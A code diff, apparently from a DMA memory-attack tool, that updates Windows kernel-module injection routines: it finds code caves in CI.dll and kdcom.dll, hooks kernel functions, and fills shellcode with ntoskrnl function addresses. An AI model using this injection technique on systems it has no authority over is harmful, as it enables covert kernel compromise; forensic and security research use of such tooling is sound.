@@ -758,8 +758,6 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
     return KMD_SetupStage3((DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
 }
 
-#ifdef WIN32
-
 /*
 * Load a kernel module (KMD) into a Windows 10 system on which not both of
 * Vt-d and Virtualization Based Security is enabled. This technique relies
@@ -804,20 +802,20 @@ BOOL KMDOpen_WINX64_2_VMM()
     //    hal.dll!HalBugCheckSystem (used for 'hook' to provide valid landing
     //             site for PsCreateSystemThread -> no security bugchecks...)
     // ------------------------------------------------------------------------
-    vaBaseKdCom = VMMDLL_ProcessGetModuleBase(4, L"kdcom.dll");
-    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe");
-    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddress(4, L"hal.dll", "HalBugCheckSystem");
+    vaBaseKdCom = VMMDLL_ProcessGetModuleBaseU(4, "kdcom.dll");
+    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe");
+    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddressU(4, "hal.dll", "HalBugCheckSystem");
     if(!vaBaseKdCom || !vaBaseNtoskrnl || !vaHalBugCheckSystem) {
         printf("KMD: Failed vmm.dll!ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
         goto fail;
     }
-    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", NULL, 0, &cSections) || !cSections) {
+    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", NULL, 0, &cSections) || !cSections) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #1\n");
         goto fail;
     }
     pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
     if(!pSections) { goto fail; }
-    if(!VMMDLL_ProcessGetSections(4, L"kdcom.dll", pSections, cSections, &cSections)) {
+    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", pSections, cSections, &cSections)) {
         printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
         goto fail;
     }
@@ -843,13 +841,13 @@ BOOL KMDOpen_WINX64_2_VMM()
     //    i.e. function table in hal.dll heap. Result is address of function pointer to
     //    place hook upon.
     // ------------------------------------------------------------------------
-    if(!VMMDLL_Map_GetPte(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
+    if(!VMMDLL_Map_GetPteU(4, NULL, &cbMemMap, FALSE) || !cbMemMap) {
         printf("KMD: Failed vmm.dll!Map_GetPte #1.\n");
         goto fail;
     }
     pMemMap = LocalAlloc(LMEM_ZEROINIT, cbMemMap);
     if(!pMemMap) { goto fail; }
-    if(!VMMDLL_Map_GetPte(4, pMemMap, &cbMemMap, FALSE)) {
+    if(!VMMDLL_Map_GetPteU(4, pMemMap, &cbMemMap, FALSE)) {
         printf("KMD: Failed vmm.dll!Map_GetPte #2.\n");
         goto fail;
     }
@@ -883,10 +881,10 @@ success_locate_hook:
     *(PQWORD)(pbExec + 0x18) = vaData + 0x10;                   // DEBUG data address
     *(PQWORD)(pbExec + 0x20) = vaData;                          // KMDDATA physical address
     *(PQWORD)(pbExec + 0x28) = vaBaseNtoskrnl;                  // NTOSKRNL.EXE virtual address
-    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory");
-    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread");
-    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress");
-    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql");
+    *(PQWORD)(pbExec + 0x30) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory");
+    *(PQWORD)(pbExec + 0x38) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread");
+    *(PQWORD)(pbExec + 0x40) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress");
+    *(PQWORD)(pbExec + 0x48) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql");
     *(PQWORD)(pbExec + 0x50) = vaHalBugCheckSystem;
     // ------------------------------------------------------------------------
     // 6: hook and watch for execution & restore
@@ -985,11 +983,11 @@ BOOL KMDOpen_WINX64_3_VMM()
     //    data: (CI.dll '.data' section)
     //    hook: (nt!PsGetCurrentProcessId)
     // ------------------------------------------------------------------------
-    f = (vaCI = VMMDLL_ProcessGetModuleBase(4, L"CI.dll")) &&
-        VMMDLL_ProcessGetSections(4, L"CI.dll", NULL, 0, &cSections) &&
+    f = (vaCI = VMMDLL_ProcessGetModuleBaseU(4, "CI.dll")) &&
+        VMMDLL_ProcessGetSectionsU(4, "CI.dll", NULL, 0, &cSections) &&
         cSections &&
         (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
-        VMMDLL_ProcessGetSections(4, L"CI.dll", pSections, cSections, &cSections);
+        VMMDLL_ProcessGetSectionsU(4, "CI.dll", pSections, cSections, &cSections);
     for(i = 0; f && (i < cSections); i++) {
         if(!strcmp("INIT", pSections[i].Name)) {
             vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
@@ -1002,7 +1000,7 @@ BOOL KMDOpen_WINX64_3_VMM()
         printf("KMD: Failed get code cave (CI.dll) #2\n");
         goto fail;
     }
-    f = (vaHook = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsGetCurrentProcessId")) &&
+    f = (vaHook = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsGetCurrentProcessId")) &&
         VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
     if(!f) {
         printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
@@ -1015,12 +1013,12 @@ BOOL KMDOpen_WINX64_3_VMM()
     // ------------------------------------------------------------------------
     // 4: Prepare and Inject!
     // ------------------------------------------------------------------------
-    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql")) &&
-        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread")) &&
-        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "ZwClose")) &&
-        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
-        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress")) &&
-        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe"));
+    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "KeGetCurrentIrql")) &&
+        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "PsCreateSystemThread")) &&
+        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "ZwClose")) &&
+        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
+        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddressU(4, "ntoskrnl.exe", "MmGetPhysicalAddress")) &&
+        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe"));
     if(!f) {
         printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
         goto fail;
@@ -1095,22 +1093,6 @@ fail:
     Vmmx_Close();
     return fResult;
 }
-
-#endif /* WIN32 */
-#ifdef LINUX
-
-BOOL KMDOpen_WINX64_2_VMM()
-{
-    printf("KMD: Failed. Not supported on Linux.\n");
-    return FALSE;
-}
-BOOL KMDOpen_WINX64_3_VMM()
-{
-    printf("KMD: Failed. Not supported on Linux.\n");
-    return FALSE;
-}
-
-#endif /* LINUX */
 
 // https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
 // HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
